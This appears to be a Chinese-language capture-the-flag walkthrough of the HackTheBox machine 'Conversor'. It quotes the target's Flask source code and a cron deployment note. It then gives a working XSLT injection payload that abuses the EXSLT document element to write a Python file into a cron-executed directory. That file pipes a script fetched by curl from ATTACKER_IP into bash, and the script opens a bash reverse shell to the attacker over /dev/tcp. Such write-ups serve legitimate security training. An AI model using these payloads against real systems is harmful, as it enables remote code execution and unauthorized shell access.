80端口有一个登录框，随便注册一个账号进去，发现有文件上传功能点，可以上传xml和xslt文件并转换为html，访问/about 可以下载源码，把源码下载下来分析一下，关键代码：
from flask import Flask, render_template, request, redirect, url_for, session, send_from_directoryimport os, sqlite3, hashlib, uuid  app = Flask(__name__)app.secret_key = &#x27;Changemeplease&#x27;  BASE_DIR = os.path.dirname(os.path.abspath(__file__))DB_PATH = &#x27;/var/www/conversor.htb/instance/users.db&#x27;UPLOAD_FOLDER = os.path.join(BASE_DIR, &#x27;uploads&#x27;)os.makedirs(UPLOAD_FOLDER, exist_ok=True)  def init_db():    os.makedirs(os.path.join(BASE_DIR, &#x27;instance&#x27;), exist_ok=True)    conn = sqlite3.connect(DB_PATH)    c = conn.cursor()    c.execute(&#x27;&#x27;&#x27;CREATE TABLE IF NOT EXISTS users (        id INTEGER PRIMARY KEY AUTOINCREMENT,        username TEXT UNIQUE,        password TEXT    )&#x27;&#x27;&#x27;)    c.execute(&#x27;&#x27;&#x27;CREATE TABLE IF NOT EXISTS files (        id TEXT PRIMARY KEY,        user_id INTEGER,        filename TEXT,        FOREIGN KEY(user_id) REFERENCES users(id)    )&#x27;&#x27;&#x27;)    conn.commit()    conn.close()  init_db()  def get_db():    conn = sqlite3.connect(DB_PATH)    conn.row_factory = sqlite3.Row    return conn  @app.route(&#x27;/&#x27;)def index():    if &#x27;user_id&#x27; not in session:        return redirect(url_for(&#x27;login&#x27;))    conn = get_db()    cur = conn.cursor()    cur.execute(&quot;SELECT * FROM files WHERE user_id=?&quot;, (session[&#x27;user_id&#x27;],))    files = cur.fetchall()    conn.close()    return render_template(&#x27;index.html&#x27;, files=files)  @app.route(&#x27;/register&#x27;, methods=[&#x27;GET&#x27;,&#x27;POST&#x27;])def register():    if request.method == &#x27;POST&#x27;:        username = request.form[&#x27;username&#x27;]        password = hashlib.md5(request.form[&#x27;password&#x27;].encode()).hexdigest()        conn = get_db()        try:            conn.execute(&quot;INSERT INTO users (username,password) VALUES (?,?)&quot;, (username,password))            conn.commit()            conn.close()            return redirect(url_for(&#x27;login&#x27;))        except sqlite3.IntegrityError:            conn.close()            return &quot;Username already exists&quot;    return render_template(&#x27;register.html&#x27;)@app.route(&#x27;/logout&#x27;)def logout():    session.clear()    return redirect(url_for(&#x27;login&#x27;))    @app.route(&#x27;/about&#x27;)def about(): return render_template(&#x27;about.html&#x27;)  @app.route(&#x27;/login&#x27;, methods=[&#x27;GET&#x27;,&#x27;POST&#x27;])def login():    if request.method == &#x27;POST&#x27;:        username = request.form[&#x27;username&#x27;]        password = hashlib.md5(request.form[&#x27;password&#x27;].encode()).hexdigest()        conn = get_db()        cur = conn.cursor()        cur.execute(&quot;SELECT * FROM users WHERE username=? AND password=?&quot;, (username,password))        user = cur.fetchone()        conn.close()        if user:            session[&#x27;user_id&#x27;] = user[&#x27;id&#x27;]            session[&#x27;username&#x27;] = username            return redirect(url_for(&#x27;index&#x27;))        else:            return &quot;Invalid credentials&quot;    return render_template(&#x27;login.html&#x27;)    @app.route(&#x27;/convert&#x27;, methods=[&#x27;POST&#x27;])def convert():    if &#x27;user_id&#x27; not in session:        return redirect(url_for(&#x27;login&#x27;))    xml_file = request.files[&#x27;xml_file&#x27;]    xslt_file = request.files[&#x27;xslt_file&#x27;]    from lxml import etree    xml_path = os.path.join(UPLOAD_FOLDER, xml_file.filename)    xslt_path = os.path.join(UPLOAD_FOLDER, xslt_file.filename)    xml_file.save(xml_path)    xslt_file.save(xslt_path)    try:        parser = etree.XMLParser(resolve_entities=False, no_network=True, dtd_validation=False, load_dtd=False)        xml_tree = etree.parse(xml_path, parser)        xslt_tree = etree.parse(xslt_path)        transform = etree.XSLT(xslt_tree)        result_tree = transform(xml_tree)        result_html = str(result_tree)        file_id = str(uuid.uuid4())        filename = f&quot;&#123;file_id&#125;.html&quot;        html_path = os.path.join(UPLOAD_FOLDER, filename)        with open(html_path, &quot;w&quot;) as f:            f.write(result_html)        conn = get_db()        conn.execute(&quot;INSERT INTO files (id,user_id,filename) VALUES (?,?,?)&quot;, (file_id, session[&#x27;user_id&#x27;], filename))        conn.commit()        conn.close()        return redirect(url_for(&#x27;index&#x27;))    except Exception as e:        return f&quot;Error: &#123;e&#125;&quot;  @app.route(&#x27;/view/&lt;file_id&gt;&#x27;)def view_file(file_id):    if &#x27;user_id&#x27; not in session:        return redirect(url_for(&#x27;login&#x27;))    conn = get_db()    cur = conn.cursor()    cur.execute(&quot;SELECT * FROM files WHERE id=? AND user_id=?&quot;, (file_id, session[&#x27;user_id&#x27;]))    file = cur.fetchone()    conn.close()    if file:        return send_from_directory(UPLOAD_FOLDER, file[&#x27;filename&#x27;])    return &quot;File not found&quot;

To deploy Conversor, we can extract the compressed file:  &quot;&quot;&quot;tar -xvf source_code.tar.gz&quot;&quot;&quot;  We install flask:  &quot;&quot;&quot;pip3 install flask&quot;&quot;&quot;  We can run the app.py file:  &quot;&quot;&quot;python3 app.py&quot;&quot;&quot;  You can also run it with Apache using the app.wsgi file.  If you want to run Python scripts (for example, our server deletes all files older than 60 minutes to avoid system overload), you can add the following line to your /etc/crontab.  &quot;&quot;&quot;* * * * * www-data for f in /var/www/conversor.htb/scripts/*.py; do python3 &quot;$f&quot;; done&quot;&quot;&quot;
最后一行有一个定时任务，这个定时任务是每分钟以www-data 身份运行/var/www/conversor.htb/scripts 目录下的所有python脚本，可以往这个目录下写反弹shell的脚本参考文章：XSLT Injection 
获取 User Flagshell.XSLT:
&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;xsl:stylesheet    version=&quot;1.0&quot;    xmlns:xsl=&quot;http://www.w3.org/1999/XSL/Transform&quot;    xmlns:shell=&quot;http://exslt.org/common&quot;    extension-element-prefixes=&quot;shell&quot;&gt;    &lt;xsl:template match=&quot;/&quot;&gt;        &lt;shell:document href=&quot;/var/www/conversor.htb/scripts/shell.py&quot; method=&quot;text&quot;&gt;import osos.system(&quot;curl &lt;ATTACKER_IP&gt;:8000/shell.sh|bash&quot;)        &lt;/shell:document&gt;    &lt;/xsl:template&gt;&lt;/xsl:stylesheet&gt;
shell.sh:
#! /bin/bashbash -i &gt;&amp; /dev/tcp/&lt;ATTACKER_IP&gt;/9001 0&gt;&amp;1
